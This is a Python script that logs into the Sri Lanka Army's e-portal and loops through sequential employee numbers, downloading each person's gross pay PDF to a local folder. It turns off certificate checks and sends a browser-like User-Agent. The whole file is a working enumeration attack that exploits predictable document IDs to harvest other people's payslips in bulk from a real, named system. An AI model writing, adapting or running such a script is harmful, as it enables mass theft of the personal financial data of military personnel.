import sys

import requests
import argparse
import datetime
import urllib3
import re
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
global_session = None


def get_currentTime():
    return "[" + datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S") + "]"


def print_out(msg):
    print(get_currentTime() + " " + msg)


def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("--log", help="Path to the output log.", type=str)
    parser.add_argument("--start-no", help="Start of ENO.", type=int)
    parser.add_argument("--pdf-output", help="Output path for downloaded PDFs", type=str)
    parser.add_argument("--username", help="Username to be used for login into E-PORTAL...", type=str)
    parser.add_argument("--password", help="Password to be used for login into E-PORTAL", type=str)
    return parser.parse_args()


def get_token_cookies():
    portal_get = requests.get("https://eportal.army.lk/eportal/login",
                              headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36'},
                              verify=False)
    bs_source = BeautifulSoup(portal_get.text, "html.parser")
    token = bs_source.find("input", dict(name='_token'))['value']
    return token, portal_get.cookies


def init_session(username, password):
    sess = requests.Session()
    token_cookies = get_token_cookies()
    sess_resp = sess.post("https://eportal.army.lk/eportal/login",
                          data={'username': username, 'password': password, '_token': token_cookies[0], 'remember': ''},
                          cookies=token_cookies[1],
                          headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36'},
                          verify=False)
    if "Wrong Password!" not in sess_resp.text and "Invalid User Credentials!" not in sess_resp.text and "Your Account has been Blocked" not in sess_resp.text and "Account has been suspended" not in sess_resp.text:
        return sess
    return None


def download_file(args, session, pos):

    url = "https://eportal.army.lk/eportal/grosspay/" + str(pos)
    with session.get(url, stream=True, verify=False) as pay_req:
        if pay_req.status_code != 200:
            return pay_req.status_code
        with open(args.pdf_output + '\\' + str(pos) + '.PDF', 'wb') as pdfOutput:
            for ch in pay_req.iter_content(chunk_size=500):
                pdfOutput.write(ch)
        return pay_req.status_code


if __name__ == '__main__':
    arguments = parse_args()
    global_session = init_session(arguments.username, arguments.password)
    if global_session is None:
        print_out("Entered username or password is incorrect... Try again!")
        sys.exit()

    start_pos = arguments.start_no
    while True:
        start_pos += 1
        print_out("Downloading PDF from ID " + str(start_pos))
        down_status = download_file(arguments, global_session, start_pos)
        if down_status != 200:
            print_out("Download failed for ID " + str(start_pos) + " with status code " + str(down_status))
